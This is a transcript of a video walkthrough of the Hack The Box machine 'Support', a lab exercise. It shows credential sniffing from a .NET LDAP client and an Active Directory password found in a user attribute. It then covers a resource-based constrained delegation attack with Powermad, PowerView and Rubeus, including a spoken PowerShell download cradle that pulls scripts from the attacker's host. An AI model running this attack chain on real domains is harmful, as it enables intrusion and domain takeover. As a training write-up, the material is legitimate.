 what's going on YouTube this is ipsack we're doing support from hack the box which is a really easy fun and straightforward Windows machine that involved a little bit of active directory it starts off enumerating an open file share to discover it has a.net application and the application has some hard-coded credentials that it uses to run ldap queries against the domain controller you can either reverse the binary or just wire struck the credentials out of it and do your own enumeration if you start looking at the users you'll find one user has a password in an active directory attribute and the trick here is a lot of the tools that look for this don't look at the info field they'll look at Fields like the description field but for some reason they don't look at info so if you run a lot of automated tools you'll miss it but if you manually dump ldap you discover the hard-coded credential to the support user that can use winrm to access the domain controller it's also a member of a group that has generic all permissions against the domain so you can use that to create your own machine account and do an s4u attack to abuse constrain delegation and order to impersonate an administrative user and turn the whole domain so with that being said let's jump in as always we start with the end map so Dash SC for default scripts as V enumerate versions OA put all formats playing the nmap directory and call it support and then the IP address which is 10 10 11.174. this can take some time to run so I've already ran it looking at the results we have quite a few ports open it looks like 11 because we scanned 1000 ports and 999 are filtered so the first one is domain on Port 53 its Banner tells us its simple DNS plus and then looking at the next one we have Microsoft Windows Kerberos and also active directory ldap so we know there's going to be a active directory domain controller the odd thing is I don't see any like Port 80 or 443 or like 8080 8443 or any of those other ports that are common with web so it doesn't look like we're dealing with any web whatsoever we we do see the domain name is support.hdb and we could add that to our host file and normally I would but I'm not doing it in this case because it's going to be relevant a bit later on in this box so the first thing I want to do is just enumerate SMB because that's like the only service that is listening so I'm going to do a crack map exec SMB 1010 11.174 to make sure we get some type of banner we see the domain of the box is DC and the well yeah the name of the box is DC and the domain is support.htb so let's do dash dash shares and this is just going to return pretty much the same thing we can try a null authentication by putting no username or password and this is going to uh fail we can show you Anonymous authentication which we just put anything if the user doesn't exist it falls back to I think Anonymous I believe is Windows terminology but um maybe not um I'm always bad with terminology things but when we put an invalid user with crack map exact we're able to see the support Dash tools um chair which is a non-standard chair so I'm going to do SMB client Dash capital N for no password and then 10 10 11 174 then support Dash was it tools I guess it was and the reason why I don't have to do a dash U with SMB client is because if you don't put a username it uses a username of your current user so um it attempted to authenticate to the share with the username ipsec right now if I do a dir I see a bunch of applications on Saturday May 28th one on July 20th so this timestamp sticks out also the other thing sticks out is I don't recognize this name like I know what 7zip is a 7-Zip portable.paf I'm guessing this is like portable application framework or something we have notepad plus plus portable uh putty.exe the sys internal Suite uh Winder stat calculate like Jive space and find large files Wireshark portable all these things are common applications that assist admin would have um or a support user I guess the one thing that isn't is this userinfo.exe.zip so let's get this real quick so I'm going to do get use user info.exe.zip and then I'm going to make a directory user info we can go in that directory and then unzip this and the reason why I always make it directly before unzipping is if the zip itself doesn't have a directory it goes to your current working directory which makes a whole mess so just a way to stay a bit more organized and based upon these dlls I'm going to guess this may be like a DOT net application if I do file against this we do see it is a.net assembly and because in previous boxes I installed Powershell on this box it means I also have the.net framework installed so as crazy as it sounds I can execute an Exe on Linux and if you can't do this if it gives you some type of error at the end of the video it'll get to a fresh Ubuntu machine and we'll install the.net framework so you can get this working but we have this user info exe um if I do Dash V it doesn't give me anything let's do Dash V find and it wants either first or last I'm going to guess this is first or last name since the application itself is called user info so I'll do the first name is ipsec and we get a connect error so whenever I see a connect error I gently open up Wireshark and see what's going on so we do pseudo Wireshark and the mistake I think I'm a lot of people would make when doing this is they listen on ton zero and they run this and don't see any traffic and the reason why is we're not configured to send DNS Out of Time Zero we'll connect configure to send out like your internet adapter right so I'm just going to change it over to any um it is Ethier as well but any does any adapter and I'm just going to specify DNS because that's what I'm assuming this application is trying to do and we still get the same connect Arrow right but now I can see packets and I can see it's querying for support.hdb so let's do sudo VI Etsy host and then 10 10 11 174 support.hdb and then run user info again and now we get no such object so what's happening is it is making the connection we can see if we looked at ldap I'm just going to do ton zero yep and we can get rid of this DNS filter so if I run that same exact command now that we're looking at this we see it talking to the box over ldap and we see a bind request support slash lgap so the support domain the ldap user a user called ldap and if we uh let's see if we just follow this what happens we can see support.ldap and then this separator and here's Actually the password of that user right um if you wanted to you could dig down and see it so we go in the ldap in the message and the bind request we see the username support slash odap and the authentication is simple which just is plain text so we can copy this value uh that's not it there we go so we can create creds.txt and we can call this ldap and then paste in the password so now we have some type of credits to this I'm going to run crack map exec again except this time we're going to use the ldap user and see if there's a new share right so if we run this again it's going to authentic it actually didn't authenticate uh let's see Dash u l dot starts with N ends in MZ huh let's see Dash D support login failure that is hard let's see I wonder if I can use like in packets get TGT so if we do get TGT and then we'll do support.hdb slash ldap paste in the password I put the wrong thing in see describers work re-authentication information was invalid oh I don't know why I have a dollar sign here I was doing pasting there we go so crack map exec does authenticate I thought there was something weird with this where like um ntlm authentication was disabled or something so that's why I kept going down that path we can see we can now read net logon and sis Vol so we could examine potentially like the group policy things we can also just run Bloodhound right so I'm going to go opt bloodhound.pi and we're going to run this so let's do bloodhound.pi Dash question mark Let's see we want to use I like using dnstcp then we can do think and ask for name server see yeah NS name server right up here so NS 10 10 11 174 domain support.htv user is ldap and the password uh something went on my clipboards so I should grab the password from creds.txt don't need Wireshark anymore I'm definitely going to review exactly how that dollar sign got in my clipboard so while that downloads let's do creds and let's see so there's one error I see um when running this it says fail to get service ticket for dc.support.hdb I did specify the DNS server to be this but I'm going to add this to my host file and just see if this error goes away or this warning I think I have a comment there run this again and let's just see if it goes away DC support so I think it does uh nope it connected the old apps over here but without that but I don't see any warnings so that looks better to me right and we want to grab the 440 files so let's start neo4j so neo4j console and this will allow us to start up bloodhound uh opt Bloodhounds like this log in and then we want to open up places go to home ipsac hdb support uh no it's in opt Bloodhound right up bloodhound.pi and then we're going to grab the 440 files because it's the second time we ran it and paste them in so from here we can just do the basic analysis so we can say um let's do list all code roastable accounts we don't get anything we could try shortest path to domain admins another common query and the only path to domain admin it says is administrator so if we go down a lot of these we don't really have too much info um shortest path to unconstrained delegated system administrator Enterprise admin and domain admin let's see conversible users there's nothing here own principles high value targets see administrator support what is this group group policy creator this is domain controllers so nothing too interesting with that one we are the odap user so we can do is type ldap go in and let's mark me as owned so we Mark ldap as owned and that will unlock us to do shortest path from owned principle choose ldap and we don't have anything so we don't really know what ldap can do and we're not really getting anything let's see principles with DC sync rights nothing foreign domain groups isn't going to be anything because this is only one domain there's not other domains domain uses local admins relapse all paths to high value targets nothing let's see dangerous privileges so there's really nothing here for this user and let's see the one thing I didn't do I think is collection all so we can add more collections to see if we get any more information about this so I'm going to add Dash C all um I would always recommend doing this if you don't care about opsec it is a bit noisier but I just wanted to show that we can get other information right so the default one isn't going to see something I want it to at least I'm guessing I haven't done much preparation for this video I just did this box quite a long time ago but we have a few extra files because before the 440 is just computers domains groups Json so now we're doing uh gpos which I don't think we're doing before uh containers I don't know what this one exactly is domains we did groups and ous so we have a little bit more information to input in so let's process these files and again we can go to the shortest path see if anything else shows up um domain admins I'm going to click on whoops not about settings and no display to always so I always see these so administrator users Enterprise administrator so everything is default here um Choice path domain administrator does not help where is the owned principles no data returned if we do the unconstrained delegation system we have a bit more information now right so one of the weird things is the shared support accounts thing has generic all to the DC and I call this one as weird right because if we look at everything else domain admins Enterprise admin key admins these are all um default things and we got this support user he can PS remote into the DC so I'm going to Mark as high value uh this is domain controller so there's really two things images I'm going to mark this as high value as well because this is a non-default thing we can tell it's non-default um I know it's hard to see in the um video but the last digits of this object ID are above a thousand we it's one one oh three and that's going to be non-default if I look at like domain admins that always ends in 512 Enterprise admin 519 so all the defaults are below a thousand for that very last number when non-defaults are above a thousand um generally so we can see like support is going to be where is your uuid uh 1105 and if I find domain administrator that is going to be the red 500 account and we know it's rid 500 because it ends in 500. so if I do analysis domain admins administrator look at it and it's idns in 500. so that's how we know what's default and what's not so I'm going to do analysis and we're going to do shortest path to high value targets and oh God this this made a mess um let's see key admin we don't care don't care administrator domain controller users Enterprise wow so we mark this guy so I'm not really seeing anything interesting here we could spend a lot of time uh cleaning up that node but it's not too interesting let's look at the information we have for support because that is the user right support at support.hdb and if we look it's not going to tell us anything and this is why you can't really be dependent on just one tool Because the actual information we want is in a field called info and Bloodhound looks at the field I think description but info is another good field for looking at um user information so let's do ldap search the syntax is a little bit tricky but if you look at the old videos like Cascade it should make sense so I'm going to do Dash H for the hers name so we do support.htb then we're going to do Dash D for the bind distinguished name and that's going to be ldap at support.hdb that's the username and then Dash W for the password and we can um tap the password out so creds.txt grab this see there we go and then we need to specify the um forget what it is the root domain of this so you do DC is equal to support then DC is equal to hdb and the reason you do this is the domain is support.hdb this is just how ldap refers to it so if we do this we see a bunch of information gets outputted so I'm going to do odat dot out right and if we view this we can see information for every user so the support user was interesting because it was a member of a group right so let's see um was it a lowercase let's see um I'll look at ldap I was trying to get just with the CN okay so to find the user we can do CN is equal to support so CN is equal to support and now this is going to be the support user and if we look we see the info tag and info just has a string this iron 47 pleasure 40 watchful and this turns out to be the um password of this so inside of active directory they just put the password as an attribute which is somewhat common for just shared accounts most of the time they use the description field and in that case it would probably stand out more in Bloodhound or other tools but in this case they use the info field which isn't just another field you can write to an active directory to put the password and most people with tools for some reason missed the info field so we can do CME SMB 10 10 11 174-u um or is this user I think this user was called support Dash p this password and we should hopefully see Authentication so if we look at our Bloodhound now we can Mark him as owned uh Mark user is owned and then we do analysis to do let's see shortest path and principles we can see the support user Can PS remote into the domain controller but there was the one other thing we saw right the generic all um if we go to this outbound object control this is also really good to view for users you own we can look at what they can do and we can see support is a member of the shared support which we highlighted earlier when marking things as owned and they have generic all against domain controller and this attack's gonna seem a bit tricky so if we look at this go to the abuse info there's a few steps to it and essentially what this allows us to do is we have all access over computer objects inside of the domain and computer objects generally can't do um that much right if we had all control over users in the domain we could just give ourselves domain administrator and log in but as a computer there's a bit more steps and the key thing here being we can either completely own a machine or we can create a new machine and um default Windows I believe any domain user can create up to five machines I want to say it is um you should change that when you heard in domains to remove that privilege if you don't then um just bad things can happen like this attack there was the krb relay up type of attack but that's now patched as of October I believe October 2022 but essentially uh what we're going to do this one is not patched but in order to exploit we need generic all um the old way didn't require this permission you used car B relay to give yourself the permission but since we have this already this is can't really be patched because if you can modify machine attributes you can do whatever you want so hopefully that didn't confuse you we're going to start over and explain this attack so we're going to create a new machine account and when you create accounts in active directory you can specify the password generally when a machine account is created it gets a randomized password and that means you don't know it and it's secure right but because we create the machine we can also create it with the password and what this means is we have a machine account and now in active directory that we know the password to and because we know the password to the machine account we can use that to sign tickets so if this was a regular box on the network we could do probably like a silver ticket type of attack but this isn't a real box because we just created the machine account so the next step here is to get the Sid this is going to be that number we're talking about before in the video just it's how you reference a computer in the database right but what we do with it is we add the ability for this computer to um act on the behalf of other identities so this is kind of like when I said if we could modify users we just give ourselves domain administrator this is essentially kind of the same thing in Kerberos land for a computer so what this attributes allowing us to do is um allowing the computer to essentially sign Kerberos tickets for other users other than itself so by giving it this permission and knowing the Machining password now we can forge a ticket that comes from this machine because um the machines tickets are created with the password of the machine again we know it because we created it so now we can forge a ticket the machine has the ability to masquerade as other users with that permission so we can just create a random ticket say with administrator and machines in the domain will just trust it that's essentially what we're going to be doing with this entire attack path so let's open up file Firefox so we can download all the dependencies because it mentioned two scripts the first one it wanted was power mad um and I think this one's used to add machines to domain so I'm just going to Google Powermat GitHub and we can see machine account quota and DNS exploitation tool and then the other one we'll want is power supply and I should already have that on my box so let's just go CD up get clone powermed and let's go in here and there is powermat.ps1 I believe this is going to be the one we want this looks good so I'm going to make the dub dub dub go in there and we're going to copy up power mad PS1 to this directory then there's also uh Power sploit and we've used this one a lot um grab power I want to say there's power supply Dev and I'm not positive I have power supply Dev so let's just download it uh powerspoint GitHub go here copy this and what I mean by Dev is there's this Branch Dev right so when you do a git clone you can specify Dash B Dev to go in the dev branch but now that I said that let's go here get Branch we are in Dev so this is the latest version find dot grep dash I um Power view is what we want and that's under Recon so copy this path CP Recon our view.ps1 okay and the last tool it wanted was rubius and I have that under struct collection so if we do opt shark collection I feel like I just used this tool last week I forget what video I did um outdated so any and this one if you don't have it if you just Google sharp collection um it's going to be flying Vic or have you pronounce his name and this is just the repo I use um always choose the latest version of.net if it doesn't work on that box then you can go down but you'll see some tools stop getting compiled right so the rubius version or at least sharp pound version um is different on each of these.net versions because it introduced something new and no longer is compiled on 4.5 so if you use the 4.51 it's not going to create files that are compatible with the latest version of Bloodhound you'd have to use the 4.7 so that's why I always say go with the latest version I always choose any as well it has a 64 and 80 a 32-bit version um right here but I always choose any so with that said let's grab rubius.exe and copy it hdb um what's this box name support www okay now we have all the files here python3 Dash M HTTP server and we want to remote desktop into the computer so evil winrm um then we do Dash I for IP 10 10 11 174 Dash U user support Dash p and this password was iron something right uh we grabbed it out of ldap there we go and here we are so I'm going to go into program data and I just given program data because this is generally World writable so any user can write here so I can download a file so I can curl 10 10 14 8 Port 8000 then rubies.exe Dash o rubius.exe and then I'm going to do IEX new object net.web client download string HTTP 10 10 14 8 8 000 I want to load powermat.ps1 and the next thing we load is powerview.ps1 so with all these scripts in we can begin the attack right so the first thing I do is get domain object I'm just going to make sure we can create new machines so when I get the domain object for DC equals support DC equals htb and we can select MSDS machine account quota and we see 10. so we can create a total of 10 machines I think I said five early in the video but it looks like it is 10 right so now we just follow the steps of this generic all abuse so beautiful we want to do this new machine account quota I'm going to be careful when I copy it so I don't copy the line break or change the password to Please Subscribe one two three bang it can be anything you want it to be um this machine account this is going to be the machine computer name right uh we could leave it as the default I'm just changing it to be difficult um I'll call it um we'll call it I guess bait computer right so we're going to create this and once we create it well I think we'll create it there we go fake computer account added so now we have a new computer account in the domain with the password of Please Subscribe one two three we want to get the computer Sid so I'm going to copy this and instead of attacker system we're going to put fake computer because that's the name we gave it and then if I do computer Sid we can see this right this is what we're looking at Bloodhound earlier so let's go down to the next thing let's see control so I think this SD stands for security descriptor um if I look at SD now it's just going to um be the security controls we added and we do SD bytes I don't know exactly but that's doing so we built the um Access Control entity I think that's what Ace is Maybe I'm Wrong there but this should give us the authenticate on behalf of other users so now we're going to add it so we do get domain computer and then fake computer that's a computer that we added to this domain right and what we do is pipe it to set domain object and um set the MS allowed to act on behalf to the bytes that we had just created so now that we have that we should be able to use rubius to Hash a password and the password we used was Please Subscribe one two three bang and the reason why I use this one and not the well I guess this password would work because I'm a 2018 bang but the key thing is to have an uppercase lowercase numbers and um special character just in case they have password complexity so if you just use password maybe it would fail just because of password complexity and you'd be scratching your head right so I'm going to be making tap passwords I try to obey password complexity rules so let's make sure we can execute rubius first that looks good and then hash and we're going to do please how did I say it Please Subscribe one two three bang I wasn't sure if I did the camel casing or not there we go let's see and we got the rc4h Mac and this is the thing we had wanted because it says grab it in this form so now we can do the s4u attack this is just going to be the delegation attack let's see um what is s4u active directory let's go to Google so s4u service for you I didn't like the explanation I got first this is what allows you to impersonate users um maybe like you have a website you want to access a file share on behalf of a user but don't want to store their password you'd use s4u to act on behalf of that user I believe um that's constrained authentication it's weird right but let's copy this so I'm going to copy it in chunks we'll do dot slash rubies.exe I copied rubius so the computer or the user is going to be fake computer and then a dollar sign an active directory um all computer accounts end in dollar even though we didn't create it with the dollar up here we did like fake computer um where is it we they did an attacker system here but machine accounts just end in a dollar sign uh just something you know when you work with active directory I guess so rc4 give it this then let's see we want to impersonate user I'm going to do administrator because I don't think the user admin exists right and then let's see this I would do I guess dc01 .support.hdb or is it just DC I think it was just DC uh what did we add in our host file just DC so I think this is right and we do slash PTT to pass the ticket into our current session so let's see what happens here uh KDC bad option I'm actually not sure why this happened I'm going to let's try this with lowercase DC support hdb does this work no so what I'm going to try doing is we're going to run Bloodhound again so we do opt bloodhound.pi let's see rerun this I'm going to wipe my information out I'm going to see the computer in this we're going to see if it has the permission to um do everything right so it's querying computer fake computer.support.htb so this looks good um the only thing I can guess is maybe we screwed up getting like the Sid and doing something there but right now it's looking like we have permission to do everything well the computer exists whether we have permission or not I don't know okay let's do analysis show us path domain administrator okay let's do bait computer so we have this America's owned now we can do shortest path from own principles let's see this no data returned I want to say unconstrained delegation should be true and it's not okay let's go through the commands we ran we did that so we got the computer Sid we set it in this security descriptor then we did the bytes so if we do get domain computer fake computer I'm not really sure what I'd be looking for here I see this allowed act on behalf but it's got Junk here um let's go back let's see we wanted let's see support no yeah support that go here I was going to pull up the instructions again there's one step that may have got wrong so if we look at this look at generic oh so the one thing I was questioning that I kind of changed was this get domain computer Target computer um third computer wasn't set and I set it to be my computer right I'm assuming this is going to error maybe not so we should just rerun all this so we got computer Sid um we know the computer set is correct or we assume we can reset this okay then I'm just going to run this with Target computer as a variable and access denied okay so new machine account we're going to do this in the beginning without changing things so we got account as the attacker system doing this one we got computer Sid except this okay and then we just grab this and it is getting an error and I want to say that error is let's see we never really defined Target computer right who are you use a count control attacker system bigcomputer.support.htb so it's everything so talking computer I think is it's setting it everywhere I think um is there attacker system there's attacker system here so okay let's create the rubius hash for this old thing if I have to do dot backslash I'm not sure why rubies is taking a long time here and I'm guessing when RM hung so let's just open up a new connection what did my connection to VPN die ping 10 10 11 174. internet's up reconnected the VPN oh there we go looks like I just had to reconnect is this one back up no CD slash uh program data okay I'm gonna assume this rc4 hash is the same one as summer whatever it is right principle unknown that's because we didn't change this target computer so DC support hdb that's for your attacker system admin illustrator so that's a different error reset my terminal okay let's try this one last time program data rubius login session doesn't exist I'm going to guess this is probably because when evil went or M so we have this ticket so what I'm going to do is copy the ticket V ticket dot b64 or what was it um they call it in a special format right uh it's ticket dot Kirby I want to say yeah ticket dot Kirby that's not it let's try copying again man when it rains it pours copy everything okay let's set mode to paste that looks better remove all spaces there we go so now we have a ticket so we should be able to use uh M packets ticket converter and we specify the ticket.kirby and then we want to convert it to a ticket.cache which is just how Linux generally uses it um unknown file format so I'm going to guess we don't want it in base64. so let's do base64 Dash D and we'll write it to ticket.cobee so now when we do this it has converted the could be ticket to a cc cache and the file name is this we probably should have named it like administrator.cc cash but it really doesn't matter kb5cc name is equal to ticket.c cash and then we can just use PS exact W my exact whatever you want to do specify Kerberos specify no password and then um administrator at dc.support.htb and we should use the fully qualified domains whenever doing anything in Kerberos so support.hdb the other key thing is if this doesn't work um it may not be like your tickets problem it could also just be your time problem because we are using Kerberos and Kerberos is very specific to timings so if you um see your clock skew is off by like five or ten minutes or more um you should use like ntp date to sync your times right so that's a common issue but now we're anti-authority systems so we can go into users administrator desktop and also get like uh root dot text as well so whoops type root dot text there you go so hope you guys enjoyed that um there are I guess some things I want to go over so before we wrap up the video um let's go back a few steps I wonder if the ticket I had before let's see do I still have that session I think I just closed it done I was gonna say I wonder if the session I had before was a valid Kerberos ticket is it up here nope I think I closed it oh well something weird was definitely going on with that Powershell session and that's one of the reasons why um I like using c2s generally whenever you get into um like doing ticketing stuff or switching users things like that if you just have winrm [Music] um it's a bit of a pain so you choose gently hand that much bet handle that much better uh the one thing I do want to do actually go back in Bloodhound I want to look at the computers we created right so we created attacker system well let's rerun our bloodhound up bloodhound.pi rerun this because if we look at computer let's see actually we already marked it on so we can do shortest path from our own principles no data returned I'm wondering if this now returns something because when we did the get domain computer we had specified fake computer and set that but when we use the variable Target computer um I'm not sure exactly where it's at it right it looked like it's added in more places than one so that's just what I want to check so copy all this uh we don't need to right click we can just drop the new data in and you don't have to clear the cache whenever you upload you can just upload over top of it it works just fine um let's see shortest path in principle support fake computer still don't have anything let's see if we go here first degree object don't see anything I'm going to try attacker system right I'm going to mark this one as owned shortest path from own principles so we can see attacker system is allowed to act on DC support so it was definitely the um one variable I had screwed up when it says Target computer um don't worry about setting that I guess because that's where I had screwed up we can see fake computer is allowed to act on either of these but the other thing I wanted to jump into that was just a weird tangent of looking at it but is the actual.net application let's go ahead and decompile that and get the password through static analysis so I've switched to a Windows machine because dnspy does not run on Linux and copy the application here so let's open up dnspy which is the decompiler and then we just go file open select our binary which is user info and then we can take a look at all the functions here right so looking at the find user option this is all related to I'm guessing maybe the GUI I'm not saying actual code if I go to user info Services we can look at this right and this is the actual code we see here um it looks like it's logging into ldap right here and with the password and we have to see where it gets the password um we see string password is equal to protected dot get password and there is a protected module here and we see get password and it's going to use the variable encrypted password which is this string and this looks basically for encoded let's see oh it is we see base64 here and that assigns it to the array and it's going to Loop over the encrypted password and then this sign is an xor so it's going to xor it with the protected key which looks like it is a Mondo and then export again with 223 which is just a character and if we look at this we see in HEX base 16 it is DF and oxdf is the creator of this box so he's just extorting it with oxdf as well um if we open up cyber Chef we should be able to recreate this pretty quickly so whenever I'm doing any type of reversing or like this encryption thing cyber Chef is my go-to option because it's a lot quicker than writing the python code to do it myself so we put in the um string here say from base64 because we're mimicking this feature right now and all we have to do is exert with Armando so let's copy this and search for xor Armando as the key and the trick here is we're going to have to change the mode from hex to either UTF or Latin one I don't think it really matters what which one because they're both just character encoding and we're not using any UTF um 8 or Latin one specific characters so that doesn't matter the key thing is you tell it it's not hex right and then the last piece is xor with two two three so we're going to go back here and this xor I'm going to make this a bit smaller so we can fit it all in one we do the key as two two three it's marked as hex this is a decimal value and we can see the password right here so this is how you could just um reverse it through static analysis apologies for the sloppy cut but I did want to show how to get the user info executed on Linux because if you don't have the.net installed you're going to have this type of error message where it just can't execute the binary format so I don't have Powershell on Linux installed so that's the first thing I'm going to do and me personally I really hate snap I don't know why I just don't like that package so we're gonna install it the Microsoft way is just Google install Powershell Linux you go to microsource documentation and then it talks about all the distros they support now I'm on Ubuntu which we see it's supported between 1804 to 22. so scrolling down we just go to this documentation and each version of Ubuntu has its own little um repository right and if I look at my parrot VM I can see what I'm on so if we go Etsy apt um sources.whist dot d then Microsoft we can see I used Ubuntu 20's Repository um going back to this machine Let's just configure it so the first thing I don't know why but whenever you install a repository it always wants you to just do an apt-kit update first and we're going to install some requirements it's going to get wget so we can download the next file then we're going to make sure our app supports https and I'm not sure exactly what package this is right but Microsoft's telling us to install it so let's download this and this package the packages Microsoft prod.deb is going to add Microsoft repository and their um gpg Keys which is what they use to um validate your game of gray packages so you can't be mayor in the middle when you're installing a package from Microsoft so now that we have it if we ran apt-get update again it would show that like Powershell and all the modules are there we haven't ran it yet so we haven't populated the repository so that's why it's not there so I'm going to do apt update and this is just going to update all the repositories we can see we have pulled the repository and the command they did this LSB release Dash RS is just going to con uh output which version right so that's why we didn't have to specify um the 20.04 version of Microsoft because the W get command they did gave us did it for us so now we want to just oh we already downloaded it we just want to install Powershell so looking this we don't have Powershell installing it we should get it right after this and we'll see if installing Powershell will give us net I don't think it will actually because I'm looking at the new packages installed and it's only installing one and that is Powershell so it's unpacking and once it's done it's probably done already I can do this and yes I can go in Powershell we execute user info again we still get an error so let's do appsearch.net and we're going to install the um let's see we don't want SDK because that's software development kit probably runtime dependencies so I'm going to install the.net runtime so apt install.net runtime version 7.0 and after this we'll see if we can execute it uh exact file format error that's not what I expected let's see dot net run userinfo.exe uh maybe we need the SDK let's do appsearch.net sudo apt install that's the targeting pack SDK 7.0 maybe Java spoiled me um for Java like to execute a jar you just need the Java runtime environment and to do any type of compiling you need the jdk which is Java development kit so maybe.net doesn't follow that same terminology I probably should have prepared to do this segment before just jumping into it right but we learn as we go so let's run this still can't so I should now have the.net application so we do.net run userinfo.exe I wonder if this is expecting source code see.net list see how do I see my runtime that's SDK commands list runtimes this is what I want dot net list run times says I have.net core app see let's open a new terminal window still can't hmm let's try running file against this application see it also says it's mono so let's do an apt search mono and see if there's anything here or actually I can just do D package.l grab mono Let's see we have Ubuntu mono installed if I go back to my parent machine D package.l Grant mono not money mono we have the mono runtime installed and I don't think I had that here I don't so let's do an sudo at search mono and see what there is re-enter my password there's a lot of packages monotone mono Dash so we have mono runtime here let's see I want to say we have to install monocomplete so sudo apt install mono Dash complete and this hopefully will be the last piece of the puzzle to execute.net on this Linux machine um I'm trying to think why I did this on my parrot I can't remember when I actually configured this to execute.net I'm guessing I did this just because I was compiling.net and building a net application on Linux a long time ago but um your guess is good as mine at this point so this is almost done installing I was thinking if I wanted to cut the video or not but if I did it'll finish soon as I do so now that it is complete I can execute this and we finally get the output we expected so we have to install.net in the mono runtime and then we can execute.net on Linux hope you guys enjoyed that video take care and I will see you all next time